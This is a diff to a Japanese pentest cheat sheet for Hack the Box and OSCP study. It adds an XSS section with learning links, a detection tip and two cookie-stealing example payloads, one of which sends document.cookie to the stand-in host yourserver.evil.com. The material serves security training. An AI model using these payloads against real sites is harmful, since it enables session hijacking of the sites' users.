@@ -46,6 +46,7 @@ Hack the Box の攻略や、OSCP 取得を目指すためのチートシート�
   - hashcat
 - [SQL injection](#SQLインジェクション)
 - [XML injection](#XMLインジェクション)
+- [XSS](#XSS)
 - [LFI](#LFI)
 - [SSRF](#SSRF)
 - [SSTI](#SSTI)
@@ -1638,6 +1639,30 @@ XXE による LFI では、外部実体参照の記法を用いる。
 
 ここでは、 file:// スキームを利用することで、ローカルファイル内にある /etc/passwd というセンシティブなファイルを表示させるようなXML となっている。
 
+
+## XSS
+
+[TryHackMe](https://tryhackme.com/room/xss)
+
+[HackTheBox Schooled](https://www.youtube.com/watch?v=bUfZlBMFJ2I)
+
+[PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+
+[Dom Based XSS の解説記事](https://gihyo.jp/dev/serial/01/javascript-security/0006?page=1)
+
+- detect のコツ
+
+あやしいinput fieldに、`<b>XSS TEST</b>` をうめこみ、太字になるか確かめる。
+
+```
+
+ex:
+
+<script>document.location='/log/'+document.cookie</script>
+
+<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />
+
+```
 
 ## LFI
 
